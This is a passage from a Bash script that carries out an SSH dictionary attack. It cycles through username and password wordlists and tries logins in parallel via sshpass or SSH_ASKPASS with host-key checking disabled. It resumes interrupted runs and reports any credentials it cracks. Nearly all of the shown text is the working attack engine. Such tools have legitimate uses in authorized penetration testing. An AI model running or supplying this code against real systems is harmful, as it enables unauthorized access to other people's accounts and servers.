        "Resume file is corrupted, starting from beginning"
      rm -f "${RESUME_FILE}"
    else
      msg_info \
        "Found resume file with username: '${lastuser}'" \
        "and password: '${lastpass}'"
      msg_info "Restoring progress..."

      local row1user rvaluser row1pass rvalpass
      # grep -F = literal match (no regex), -x = full line,
      # -n = print line number. sed strips \r first.
      row1user="$(sed 's/\r$//' "${userlist}" \
        | grep -Fxn -- "${lastuser}")"
      rvaluser=${?}
      row1pass="$(sed 's/\r$//' "${passlist}" \
        | grep -Fxn -- "${lastpass}")"
      rvalpass=${?}

      if [[ "${rvaluser}" -eq 0 ]]; then
        local rowuser="${row1user%%:*}"
        tail -n +"${rowuser}" "${userlist}" \
          > "${userlist}.new"
        userlist="${userlist}.new"
      else
        msg_warn \
          "User '${lastuser}' not found in user list," \
          "starting from beginning"
        rm -f "${RESUME_FILE}"
      fi

      if [[ "${rvaluser}" -eq 0 && "${rvalpass}" -eq 0 ]]; then
        local rowpass="${row1pass%%:*}"
        tail -n +"${rowpass}" "${passlist}" \
          > "${passlist}.new"
        passlist="${passlist}.new"
      elif [[ "${rvaluser}" -eq 0 && "${rvalpass}" -ne 0 ]]; then
        msg_warn \
          "Password '${lastpass}' not found in password list," \
          "starting passwords from beginning"
      fi
    fi
  fi

  local remaining_users remaining_passes
  maxusercount="$(grep -c '' "${fulluserlist}")"
  maxpasscount="$(grep -c '' "${fullpasslist}")"
  total_attempts=$(( maxusercount * maxpasscount ))
  remaining_users="$(grep -c '' "${userlist}")"
  remaining_passes="$(grep -c '' "${passlist}")"
  # Completed = total - remaining in current user's pass list
  #   - (remaining users after current) * full pass list size
  attempt=$(( total_attempts - remaining_passes \
    - (remaining_users - 1) * maxpasscount ))
  if (( attempt < 0 )); then attempt=0; fi

  if (( attempt > 0 )); then
    local fmt_val
    format_number "${maxusercount}" fmt_val
    msg_info "Users:                       ${fmt_val}"
    format_number "${maxpasscount}" fmt_val
    msg_info "Passwords:                   ${fmt_val}"
    format_number "${total_attempts}" fmt_val
    msg_info "Combinations:                ${fmt_val}"
    format_number "${attempt}" fmt_val
    msg_info "Previously tried passwords:  ${fmt_val}"
    if [[ ! -t 1 ]]; then
      local remaining=$(( total_attempts - attempt ))
      format_number "${remaining}" fmt_val
      msg_info "Passwords remaining:         ${fmt_val}"
    fi
  fi
}

##############################
# Attack engine
##############################

# Attempt SSH login with a single username/password pair.
try_ssh() {
  local user="${1}"
  local pass="${2}"
  local retval=1
  local -i retries=0

  local ssh_err
  while true; do
    if [[ -n "${use_sshpass}" ]]; then
      sshpass -p "${pass}" ssh \
        -o StrictHostKeyChecking=no \
        -o PubkeyAuthentication=no \
        -o ConnectTimeout="${ssh_timeout}" \
        -p "${port}" "${user}@${host}" exit &>/dev/null
      retval=${?}
      # sshpass: 0=success, 5=auth failure, 3/255=connection error
      [[ "${retval}" -eq 0 || "${retval}" -eq 5 ]] && break
    else
      ssh_err=$(SSH_ASKPASS="${ASKPASS_SCRIPT}" SSH_ASKPASS_REQUIRE=force \
        SSH_PASSWORD="${pass}" ssh \
        -o StrictHostKeyChecking=no \
        -o PubkeyAuthentication=no \
        -o NumberOfPasswordPrompts=1 \
        -o ConnectTimeout="${ssh_timeout}" \
        -p "${port}" "${user}@${host}" exit 2>&1 >/dev/null)
      retval=${?}
      # ssh exits 255 for both auth failure and connection errors.
      # Only retry on connection errors (auth failure contains "Permission denied").
      [[ "${retval}" -ne 255 ]] && break
      [[ "${ssh_err}" == *"Permission denied"* ]] && break
    fi

    # Another job already found the password - stop retrying
    [[ -f "${RESULT_FILE}" ]] && return
    if (( retries >= max_retries )); then
      msg_warn "Max retries (${max_retries}) reached"
      return
    fi
    ((retries++))
    sleep "${RETRY_SLEEP}"
  done

  if [[ "${retval}" -eq 0 ]]; then
    printf '%s\n' \
      "Found username: '${user}' and password: '${pass}'" \
      > "${RESULT_FILE}"
  fi
}

# Remove finished PIDs from CHILD_PIDS.
prune_finished_pids() {
  local active=()
  for pid in "${CHILD_PIDS[@]}"; do
    if kill -0 "${pid}" 2>/dev/null; then
      active+=("${pid}")
    fi
  done
  CHILD_PIDS=("${active[@]}")
}

# Block until a background job slot is available.
wait_for_job_slot() {
  (( max_jobs == 0 )) && return
  while true; do
    prune_finished_pids
    (( ${#CHILD_PIDS[@]} < max_jobs )) && return
    sleep "${POLL_SLEEP}"
  done
}

# Print attack configuration summary before pre-flight checks.
print_attack_config() {
  local ssh_method jobs_label
  if [[ -n "${use_sshpass}" ]]; then
    ssh_method="sshpass"
  else
    ssh_method="SSH_ASKPASS"
  fi
  if (( max_jobs == 0 )); then
    jobs_label="unlimited"
  else
    jobs_label="max ${max_jobs}"
  fi
  msg_info "Target:              ${host}:${port}"
  msg_info "SSH method:          ${ssh_method}"
  msg_info "SSH parallel jobs:   ${jobs_label}"
  msg_info "SSH delay:           ${delay}s"
  msg_info "SSH timeout:         ${ssh_timeout}s"
  msg_info "SSH retries:         ${max_retries}"
}

# Main attack loop.
launch_attack() {
  # Reset bash builtin timer so elapsed_time() measures attack only
  SECONDS=0
  local fmt_val fmt_att fmt_tot
  if (( attempt == 0 )); then
    format_number "${maxusercount}" fmt_val
    msg_info "Users:                       ${fmt_val}"
    format_number "${maxpasscount}" fmt_val
    msg_info "Passwords:                   ${fmt_val}"
    format_number "${total_attempts}" fmt_val
    msg_info "Combinations:                ${fmt_val}"
  fi
  msg_info "Starting attack..."

  if [[ -t 1 ]]; then
    progress_bar_setup
    (( PB_TRIED_ROW > 0 )) && progress_bar_update "${attempt}" "${total_attempts}"
  fi

  # || [[ -n ]] handles files missing a trailing newline
  # ${var%$'\r'} strips Windows carriage return (\r\n -> \n)
  while IFS= read -r user || [[ -n "${user}" ]]; do
    user="${user%$'\r'}"
    [[ -z "${user}" ]] && continue
    while IFS= read -r pass || [[ -n "${pass}" ]]; do
      pass="${pass%$'\r'}"
      [[ -z "${pass}" ]] && continue

      if [[ -f "${RESULT_FILE}" ]]; then
        evaluate_result
      fi

      ((attempt++))
      if [[ -t 1 ]] && (( PB_TRIED_ROW > 0 )); then
        progress_bar_draw "${user}" "${pass}"
        progress_bar_update "${attempt}" "${total_attempts}"
      else
        format_number "${attempt}" fmt_att
        format_number "${total_attempts}" fmt_tot
        printf \
          '[%s/%s] Trying user: '\''%s'\'' password: '\''%s'\''\n' \
          "${fmt_att}" "${fmt_tot}" "${user}" "${pass}"
      fi

      printf '%s\t%s\n' "${user}" "${pass}" > "${RESUME_FILE}"

      wait_for_job_slot
      # </dev/null prevents background job from stealing the
      # wordlist file descriptor that the outer read loop uses
      try_ssh "${user}" "${pass}" </dev/null &
      CHILD_PIDS+=("${!}")
      (( attempt % 100 == 0 )) && prune_finished_pids

      sleep "${delay}"
    done < "${passlist}"
    # Reset to full password list for the next username
    passlist="${fullpasslist}"
  done < "${userlist}"

  # Wait for all background try_ssh jobs before checking results
  wait

  evaluate_result
}

# Check if a password was found and display results.
evaluate_result() {
  cleanup
  [[ -t 1 ]] && progress_bar_clear

  if [[ -f "${RESULT_FILE}" ]]; then
    printf \
      '\r\033[K%(%Y-%m-%d %H:%M:%S)T [%bOK   %b] %b%s%b\n' \
      -1 "${GREEN}" "${RESET}" \
      "${GREEN}${BOLD}" "$(<"${RESULT_FILE}")" "${RESET}"
    elapsed_time
    rm -f "${RESUME_FILE}"
    exit 0
  else
    printf '\r\033[K'
    msg_warn "Password not found. Try a different dictionary."
    elapsed_time
    rm -f "${RESUME_FILE}"
    exit 1
  fi
}

##############################
# Signal handling
##############################

# Handle termination signals with clean shutdown.
handle_signal() {
  local msg="${1}" code="${2}"
  if [[ -t 1 ]]; then
    progress_bar_clear
    # If progress_bar_setup never ran (e.g. terminal too small), cursor may
    # be mid-line after progress_bar_draw; move to a clean line.
    (( PB_TRIED_ROW == 0 )) && printf '\n'
  fi
  [[ -n "${msg}" ]] && msg_warn "${msg}"
  cleanup
  exit "${code}"
}

# Redraw progress bar on terminal resize.
handle_winch() {
  if [[ -t 1 && ${PB_ROWS} -gt 0 ]]; then
    progress_bar_clear
    progress_bar_setup 1
    (( PB_TRIED_ROW > 0 )) && progress_bar_update "${attempt}" "${total_attempts}"
  fi
}

# Register signal handlers for clean shutdown.
setup_signal_handlers() {
  trap 'handle_signal "Interrupted. Run the script again to resume." 130' INT
  trap 'handle_signal "Stopped. Run the script again to resume." 148' TSTP
  trap 'handle_signal "" 129' HUP
  trap 'handle_signal "" 143' TERM
  trap 'handle_signal "" 131' QUIT
  trap 'handle_winch' WINCH
  # Remove temp files and reset the terminal on any exit, including early
  # error exits before the attack starts. cleanup is idempotent — safe to
  # call again after handle_signal or evaluate_result already ran it.
  # \033[s/\033[u save/restore cursor position around \033[r (which homes to row 1).
  trap 'cleanup; [[ -t 1 ]] && printf "\033[s\033[r\033[?25h\033[u" >/dev/tty 2>/dev/null' EXIT
}

##############################
# Main execution flow
##############################

main() {
  read_args "${@}"                # 1. Parse command-line flags
  check_args                      # 2. Validate inputs and dependencies
  setup_signal_handlers           # 3. Set traps for clean shutdown
  create_askpass_helper           # 4. Create SSH_ASKPASS helper
  print_attack_config             # 5. Print attack configuration
  check_ssh_connection            # 6. Test SSH connectivity
  filter_users_by_password_auth   # 7. Filter users with password auth
  restore_progress                # 8. Resume from last attempt
  launch_attack                   # 9. Run the dictionary attack
}

main "${@}"
